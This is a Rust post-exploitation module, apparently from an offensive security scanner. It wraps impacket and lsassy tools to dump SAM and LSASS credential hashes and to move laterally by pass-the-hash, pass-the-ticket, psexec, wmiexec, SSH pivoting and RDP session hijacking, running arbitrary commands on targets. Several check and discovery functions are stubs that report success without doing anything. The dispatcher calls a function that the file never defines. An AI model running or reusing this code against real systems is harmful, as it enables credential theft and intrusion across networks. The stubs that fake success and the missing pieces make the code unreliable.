// Post-Exploitation Module
// Credential harvesting, privilege escalation, persistence, and lateral movement
// Uses impacket tools for real implementations

use crate::scanner::exploitation::types::*;
use anyhow::{anyhow, Result};
use chrono::Utc;
use log::info;
use tokio::process::Command;
use std::time::Duration;
use std::collections::HashMap;

/// Helper to create a PostExploitFinding
fn make_finding(finding_type: &str, value: &str, severity: Severity) -> PostExploitFinding {
    PostExploitFinding {
        finding_type: finding_type.to_string(),
        value: value.to_string(),
        details: None,
        severity,
    }
}

/// Helper to create a PostExploitFinding with details
fn make_finding_with_details(
    finding_type: &str,
    value: &str,
    details: HashMap<String, serde_json::Value>,
    severity: Severity
) -> PostExploitFinding {
    PostExploitFinding {
        finding_type: finding_type.to_string(),
        value: value.to_string(),
        details: Some(details),
        severity,
    }
}

/// Run a post-exploitation module
pub async fn run_module(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!(
        "Running post-exploitation module {:?} against {}",
        config.module, config.target
    );

    let result = match config.module {
        // Credential Harvesting
        PostExploitModule::DumpSam => dump_sam(config).await,
        PostExploitModule::DumpLsass => dump_lsass(config).await,
        PostExploitModule::ExtractBrowserCreds => extract_browser_creds(config).await,
        PostExploitModule::ExtractWifiPasswords => extract_wifi_passwords(config).await,
        PostExploitModule::DumpKeePass => dump_keepass(config).await,
        PostExploitModule::ExtractSshKeys => extract_ssh_keys(config).await,
        PostExploitModule::DumpCredMan => dump_credman(config).await,

        // Privilege Escalation Checks
        PostExploitModule::CheckAlwaysInstallElevated => check_always_install_elevated(config).await,
        PostExploitModule::CheckUnquotedPaths => check_unquoted_paths(config).await,
        PostExploitModule::CheckWeakServicePerms => check_weak_service_perms(config).await,
        PostExploitModule::CheckSeImpersonate => check_se_impersonate(config).await,
        PostExploitModule::CheckSudoers => check_sudoers(config).await,
        PostExploitModule::CheckSuid => check_suid(config).await,
        PostExploitModule::CheckCapabilities => check_capabilities(config).await,

        // Persistence
        PostExploitModule::CreateScheduledTask => create_scheduled_task(config).await,
        PostExploitModule::AddRegistryRunKey => add_registry_run_key(config).await,
        PostExploitModule::CreateService => create_service(config).await,
        PostExploitModule::AddCronJob => add_cron_job(config).await,
        PostExploitModule::AddSshKey => add_ssh_key(config).await,
        PostExploitModule::WmiEventSub => create_wmi_event_sub(config).await,

        // Lateral Movement
        PostExploitModule::PassTheHash => pass_the_hash(config).await,
        PostExploitModule::PassTheTicket => pass_the_ticket(config).await,
        PostExploitModule::PsExec => psexec(config).await,
        PostExploitModule::WmiExec => wmiexec(config).await,
        PostExploitModule::SshPivot => ssh_pivot(config).await,
        PostExploitModule::RdpHijack => rdp_hijack(config).await,

        // Discovery
        PostExploitModule::NetworkShares => enumerate_network_shares(config).await,
        PostExploitModule::DomainUsers => enumerate_domain_users(config).await,
        PostExploitModule::LocalUsers => enumerate_local_users(config).await,
        PostExploitModule::InstalledSoftware => enumerate_installed_software(config).await,
        PostExploitModule::RunningProcesses => enumerate_running_processes(config).await,
    };

    result
}

// ============================================================================
// Credential Harvesting
// ============================================================================

async fn dump_sam(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Use impacket's secretsdump.py to extract SAM/SYSTEM hashes
    info!("Attempting to dump SAM database from {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for SAM dump"))?;

    // Build credentials string for secretsdump.py
    let creds_str = build_impacket_creds(&creds, &config.target);

    let result = tokio::time::timeout(
        Duration::from_secs(120),
        Command::new("secretsdump.py")
            .args([&creds_str, "-just-dc-ntlm"])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let mut findings = Vec::new();

            // Parse NTLM hashes from output
            // Format: domain\username:RID:LMHash:NTHash:::
            for line in stdout.lines() {
                if line.contains(":") && !line.starts_with("[") && !line.starts_with("Impacket") {
                    let parts: Vec<&str> = line.split(':').collect();
                    if parts.len() >= 4 {
                        let mut details = HashMap::new();
                        details.insert("user".to_string(), serde_json::json!(parts[0]));
                        details.insert("rid".to_string(), serde_json::json!(parts.get(1).unwrap_or(&"")));
                        details.insert("lm_hash".to_string(), serde_json::json!(parts.get(2).unwrap_or(&"")));
                        details.insert("nt_hash".to_string(), serde_json::json!(parts.get(3).unwrap_or(&"")));
                        findings.push(make_finding_with_details(
                            "ntlm_hash",
                            parts[0],
                            details,
                            Severity::High,
                        ));
                    }
                }
            }

            if combined.contains("error") || combined.contains("Access denied") {
                Ok(PostExploitResult {
                    module: PostExploitModule::DumpSam,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some(format!("Access denied or error: {}", combined.chars().take(200).collect::<String>())),
                    timestamp: Utc::now(),
                })
            } else {
                info!("SAM dump completed - found {} hashes", findings.len());
                let has_findings = !findings.is_empty();
                Ok(PostExploitResult {
                    module: PostExploitModule::DumpSam,
                    target: config.target.clone(),
                    success: has_findings,
                    findings,
                    error: if has_findings { None } else { Some("No hashes extracted".to_string()) },
                    timestamp: Utc::now(),
                })
            }
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::DumpSam,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("secretsdump.py not found or failed: {}. Install: pip install impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::DumpSam,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout during SAM dump".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn dump_lsass(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Use lsassy or secretsdump for LSASS dump
    info!("Attempting to dump LSASS from {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for LSASS dump"))?;

    // Try lsassy first (more reliable for LSASS)
    let lsassy_check = Command::new("which").arg("lsassy").output().await;

    if lsassy_check.is_ok() && lsassy_check.unwrap().status.success() {
        return dump_lsass_with_lsassy(config, creds).await;
    }

    // Fallback to secretsdump with NTDS extraction
    let creds_str = build_impacket_creds(&creds, &config.target);

    let result = tokio::time::timeout(
        Duration::from_secs(180),
        Command::new("secretsdump.py")
            .args([&creds_str])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let mut findings = Vec::new();

            for line in stdout.lines() {
                if line.contains(":") && (line.contains(":::") || line.contains("aes256")) {
                    findings.push(make_finding("credential", line, Severity::High));
                }
            }

            Ok(PostExploitResult {
                module: PostExploitModule::DumpLsass,
                target: config.target.clone(),
                success: !findings.is_empty(),
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::DumpLsass,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("Failed: {}. Install lsassy or impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::DumpLsass,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn dump_lsass_with_lsassy(config: &PostExploitConfig, creds: &Credentials) -> Result<PostExploitResult> {
    let mut args = vec![
        "-u".to_string(), creds.username.clone(),
        config.target.clone(),
    ];

    if let Some(ref password) = creds.password {
        args.push("-p".to_string());
        args.push(password.clone());
    } else if let Some(ref hash) = creds.ntlm_hash {
        args.push("-H".to_string());
        args.push(hash.clone());
    }

    if let Some(ref domain) = creds.domain {
        args.push("-d".to_string());
        args.push(domain.clone());
    }

    let result = tokio::time::timeout(
        Duration::from_secs(120),
        Command::new("lsassy")
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let mut findings = Vec::new();

            // lsassy outputs credentials in a table format
            for line in stdout.lines() {
                if line.contains("NT:") || line.contains("SHA1:") || line.contains("Password:") {
                    findings.push(make_finding("lsass_credential", line.trim(), Severity::Critical));
                }
            }

            Ok(PostExploitResult {
                module: PostExploitModule::DumpLsass,
                target: config.target.clone(),
                success: !findings.is_empty(),
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        _ => Ok(PostExploitResult {
            module: PostExploitModule::DumpLsass,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("lsassy failed".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

/// Build impacket credentials string: domain/user:password@target or domain/user@target -hashes :hash
fn build_impacket_creds(creds: &Credentials, target: &str) -> String {
    let domain = creds.domain.as_deref().unwrap_or("");
    if let Some(ref password) = creds.password {
        if domain.is_empty() {
            format!("{}:{}@{}", creds.username, password, target)
        } else {
            format!("{}/{}:{}@{}", domain, creds.username, password, target)
        }
    } else if let Some(ref hash) = creds.ntlm_hash {
        if domain.is_empty() {
            format!("{}@{} -hashes :{}", creds.username, target, hash)
        } else {
            format!("{}/{}@{} -hashes :{}", domain, creds.username, target, hash)
        }
    } else {
        format!("{}@{}", creds.username, target)
    }
}

async fn extract_browser_creds(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Extracting browser credentials from {}", config.target);

    // Browser credential locations (Windows):
    // Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
    // Firefox: %APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json
    // Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

    Ok(PostExploitResult {
        module: PostExploitModule::ExtractBrowserCreds,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("Browser credential extraction not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn extract_wifi_passwords(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Windows: netsh wlan show profile name="SSID" key=clear
    // Linux: cat /etc/NetworkManager/system-connections/*
    info!("Extracting WiFi passwords from {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::ExtractWifiPasswords,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("WiFi password extraction not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn dump_keepass(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting to dump KeePass from {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::DumpKeePass,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("KeePass dump not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn extract_ssh_keys(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Look for: ~/.ssh/id_rsa, ~/.ssh/id_ed25519, etc.
    info!("Extracting SSH keys from {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::ExtractSshKeys,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("SSH key extraction not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn dump_credman(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Windows Credential Manager
    info!("Dumping Credential Manager from {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::DumpCredMan,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("Credential Manager dump not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

// ============================================================================
// Privilege Escalation Checks
// ============================================================================

async fn check_always_install_elevated(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Check registry keys:
    // HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    // HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    info!("Checking AlwaysInstallElevated on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CheckAlwaysInstallElevated,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_unquoted_paths(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Look for services with unquoted paths containing spaces
    info!("Checking for unquoted service paths on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CheckUnquotedPaths,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_weak_service_perms(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Checking for weak service permissions on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CheckWeakServicePerms,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_se_impersonate(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Check for SeImpersonatePrivilege (Potato attacks)
    info!("Checking for SeImpersonate privilege on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CheckSeImpersonate,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_sudoers(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Check sudo -l for privilege escalation opportunities
    info!("Checking sudo configuration on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CheckSudoers,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_suid(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // find / -perm -4000 2>/dev/null
    info!("Checking for SUID binaries on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CheckSuid,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_capabilities(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // getcap -r / 2>/dev/null
    info!("Checking Linux capabilities on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CheckCapabilities,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

// ============================================================================
// Persistence
// ============================================================================

async fn create_scheduled_task(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Creating scheduled task on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CreateScheduledTask,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("Scheduled task creation not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn add_registry_run_key(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Adding registry run key on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::AddRegistryRunKey,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("Registry run key addition not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn create_service(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Creating service on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::CreateService,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("Service creation not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn add_cron_job(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Adding cron job on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::AddCronJob,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("Cron job addition not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn add_ssh_key(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Adding SSH authorized key on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::AddSshKey,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("SSH key addition not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

async fn create_wmi_event_sub(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Creating WMI event subscription on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::WmiEventSub,
        target: config.target.clone(),
        success: false,
        findings: vec![],
        error: Some("WMI event subscription not yet implemented".to_string()),
        timestamp: Utc::now(),
    })
}

// ============================================================================
// Lateral Movement
// ============================================================================

async fn pass_the_hash(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting Pass-the-Hash to {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for Pass-the-Hash"))?;

    let hash = creds.ntlm_hash.as_ref()
        .ok_or_else(|| anyhow!("NTLM hash required for Pass-the-Hash"))?;

    // Use smbexec.py or psexec.py with hash
    let domain = creds.domain.as_deref().unwrap_or(".");
    let creds_str = format!("{}/{}@{}", domain, creds.username, config.target);

    // Get command to execute (default: whoami)
    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    let result = tokio::time::timeout(
        Duration::from_secs(60),
        Command::new("smbexec.py")
            .args([
                &creds_str,
                "-hashes",
                &format!(":{}", hash),
                "-c",
                command,
            ])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let success = !combined.to_lowercase().contains("access denied") &&
                         !combined.to_lowercase().contains("logon_failure") &&
                         output.status.success();

            let mut findings = Vec::new();
            if success {
                findings.push(make_finding(
                    "pth_success",
                    &format!("{}@{}: {}", creds.username, config.target, stdout.trim()),
                    Severity::Critical,
                ));
            }

            info!("Pass-the-Hash {} for {}@{}",
                  if success { "succeeded" } else { "failed" },
                  creds.username, config.target);

            Ok(PostExploitResult {
                module: PostExploitModule::PassTheHash,
                target: config.target.clone(),
                success,
                findings,
                error: if success { None } else { Some(combined.chars().take(200).collect()) },
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheHash,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("smbexec.py not found: {}. Install: pip install impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheHash,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn pass_the_ticket(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting Pass-the-Ticket to {}", config.target);

    // Get ticket file path from options
    let ticket_file = config.options.get("ticket_file")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow!("ticket_file option required for Pass-the-Ticket"))?;

    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    // Use getST.py or ticketer.py to use the ticket
    let result = tokio::time::timeout(
        Duration::from_secs(60),
        Command::new("psexec.py")
            .env("KRB5CCNAME", ticket_file)
            .args([
                "-k",
                "-no-pass",
                &config.target,
                command,
            ])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let success = output.status.success();

            let mut findings = Vec::new();
            if success {
                findings.push(make_finding(
                    "ptt_success",
                    &format!("{}:{}", config.target, stdout.trim()),
                    Severity::Critical,
                ));
            }

            Ok(PostExploitResult {
                module: PostExploitModule::PassTheTicket,
                target: config.target.clone(),
                success,
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheTicket,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("Failed: {}", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheTicket,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn psexec(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting PsExec to {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for PsExec"))?;

    let creds_str = build_impacket_creds(&creds, &config.target);

    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    let mut args = vec![creds_str];
    if let Some(ref hash) = creds.ntlm_hash {
        if creds.password.is_none() {
            args.push("-hashes".to_string());
            args.push(format!(":{}", hash));
        }
    }
    args.push("-c".to_string());
    args.push(command.to_string());

    let result = tokio::time::timeout(
        Duration::from_secs(90),
        Command::new("psexec.py")
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let success = !combined.to_lowercase().contains("access denied") &&
                         !combined.to_lowercase().contains("error") &&
                         (stdout.contains("Windows") || stdout.lines().count() > 0);

            let mut findings = Vec::new();
            if success {
                findings.push(make_finding(
                    "psexec_success",
                    &format!("{}@{}: {}", creds.username, config.target, stdout.trim()),
                    Severity::Critical,
                ));
            }

            info!("PsExec {} for {}@{}",
                  if success { "succeeded" } else { "failed" },
                  creds.username, config.target);

            Ok(PostExploitResult {
                module: PostExploitModule::PsExec,
                target: config.target.clone(),
                success,
                findings,
                error: if success { None } else { Some(combined.chars().take(200).collect()) },
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::PsExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("psexec.py not found: {}. Install: pip install impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::PsExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn wmiexec(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting WMI execution on {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for WMI execution"))?;

    let creds_str = build_impacket_creds(&creds, &config.target);

    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    let mut args = vec![creds_str];
    if let Some(ref hash) = creds.ntlm_hash {
        if creds.password.is_none() {
            args.push("-hashes".to_string());
            args.push(format!(":{}", hash));
        }
    }
    args.push(command.to_string());

    let result = tokio::time::timeout(
        Duration::from_secs(60),
        Command::new("wmiexec.py")
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let success = !combined.to_lowercase().contains("access denied") &&
                         output.status.success();

            let mut findings = Vec::new();
            if success {
                let mut details = HashMap::new();
                details.insert("target".to_string(), serde_json::json!(config.target));
                details.insert("user".to_string(), serde_json::json!(creds.username));
                details.insert("output".to_string(), serde_json::json!(stdout.trim()));
                findings.push(make_finding_with_details(
                    "wmiexec_success",
                    &format!("{}@{}", creds.username, config.target),
                    details,
                    Severity::Critical,
                ));
            }

            Ok(PostExploitResult {
                module: PostExploitModule::WmiExec,
                target: config.target.clone(),
                success,
                findings,
                error: if success { None } else { Some(combined.chars().take(200).collect()) },
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::WmiExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("wmiexec.py not found: {}", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::WmiExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn ssh_pivot(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Setting up SSH pivot through {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for SSH pivot"))?;

    // Get pivot configuration
    let local_port = config.options.get("local_port")
        .and_then(|v| v.as_u64())
        .unwrap_or(1080) as u16;

    let remote_host = config.options.get("remote_host")
        .and_then(|v| v.as_str())
        .unwrap_or("127.0.0.1");

    let remote_port = config.options.get("remote_port")
        .and_then(|v| v.as_u64())
        .unwrap_or(22) as u16;

    // Setup SSH tunnel: ssh -D local_port user@target (SOCKS proxy)
    // or: ssh -L local_port:remote_host:remote_port user@target (port forward)
    let tunnel_type = config.options.get("tunnel_type")
        .and_then(|v| v.as_str())
        .unwrap_or("socks"); // "socks" or "forward"

    let tunnel_arg = if tunnel_type == "socks" {
        format!("-D {}", local_port)
    } else {
        format!("-L {}:{}:{}", local_port, remote_host, remote_port)
    };

    info!("SSH pivot: {} via {}@{}", tunnel_arg, creds.username, config.target);

    // For actual pivot, we'd need to keep the SSH session running
    // This just validates the connection would work
    let mut args = vec![
        "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(), "BatchMode=yes".to_string(),
        "-o".to_string(), "ConnectTimeout=10".to_string(),
    ];

    if let Some(ref password) = creds.password {
        // Use sshpass for password auth
        args.insert(0, password.clone());
        args.insert(0, "-p".to_string());
    }

    args.push(format!("{}@{}", creds.username, config.target));
    args.push("echo".to_string());
    args.push("pivot_test".to_string());

    let cmd = if creds.password.is_some() { "sshpass" } else { "ssh" };

    let result = tokio::time::timeout(
        Duration::from_secs(30),
        Command::new(cmd)
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let success = stdout.contains("pivot_test") || output.status.success();

            let mut findings = Vec::new();
            if success {
                let mut details = HashMap::new();
                details.insert("target".to_string(), serde_json::json!(config.target));
                details.insert("tunnel_type".to_string(), serde_json::json!(tunnel_type));
                details.insert("local_port".to_string(), serde_json::json!(local_port));
                details.insert("command".to_string(), serde_json::json!(format!("ssh {} {}@{}", tunnel_arg, creds.username, config.target)));
                findings.push(make_finding_with_details(
                    "ssh_pivot_ready",
                    &format!("{}@{} on port {}", creds.username, config.target, local_port),
                    details,
                    Severity::High,
                ));
            }

            Ok(PostExploitResult {
                module: PostExploitModule::SshPivot,
                target: config.target.clone(),
                success,
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::SshPivot,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("SSH failed: {}", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::SshPivot,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Connection timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn rdp_hijack(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting RDP session hijack on {}", config.target);

    // RDP hijacking requires SYSTEM privileges and uses tscon.exe
    // This is a placeholder - real implementation requires being on the target

    let creds = config.credentials.as_ref();

    // Get session ID to hijack
    let session_id = config.options.get("session_id")
        .and_then(|v| v.as_u64());

    if session_id.is_none() {
        let mut details = HashMap::new();
        details.insert("message".to_string(), serde_json::json!("To hijack RDP sessions, first enumerate sessions with 'query session' then specify session_id option"));
        details.insert("command_template".to_string(), serde_json::json!("tscon <SESSION_ID> /dest:console"));
        return Ok(PostExploitResult {
            module: PostExploitModule::RdpHijack,
            target: config.target.clone(),
            success: false,
            findings: vec![make_finding_with_details(
                "rdp_info",
                "session_id required",
                details,
                Severity::Low,
            )],
            error: Some("session_id option required".to_string()),
            timestamp: Utc::now(),
        });
    }

    // If we have creds, try to execute remotely
    if let Some(creds) = creds {
        let creds_str = build_impacket_creds(&creds, &config.target);
        let cmd = format!("tscon {} /dest:console", session_id.unwrap());

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("wmiexec.py")
                .args([&creds_str, &cmd])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let success = output.status.success();
                let mut details = HashMap::new();
                details.insert("session_id".to_string(), serde_json::json!(session_id));
                details.insert("result".to_string(), serde_json::json!(if success { "success" } else { "failed" }));
                Ok(PostExploitResult {
                    module: PostExploitModule::RdpHijack,
                    target: config.target.clone(),
                    success,
                    findings: vec![make_finding_with_details(
                        "rdp_hijack_attempt",
                        &format!("session {} on {}", session_id.unwrap_or(0), config.target),
                        details,
                        if success { Severity::Critical } else { Severity::Medium },
                    )],
                    error: None,
                    timestamp: Utc::now(),
                })
            }
            _ => Ok(PostExploitResult {
                module: PostExploitModule::RdpHijack,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("Execution failed".to_string()),
                timestamp: Utc::now(),
            }),
        }
    } else {
        Ok(PostExploitResult {
            module: PostExploitModule::RdpHijack,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Credentials required for remote RDP hijack".to_string()),
            timestamp: Utc::now(),
        })
    }
}

// ============================================================================
// Discovery
// ============================================================================

async fn enumerate_network_shares(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Enumerating network shares on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::NetworkShares,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn enumerate_domain_users(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Enumerating domain users from {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::DomainUsers,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn enumerate_local_users(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Enumerating local users on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::LocalUsers,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

async fn enumerate_installed_software(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Enumerating installed software on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::InstalledSoftware,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}

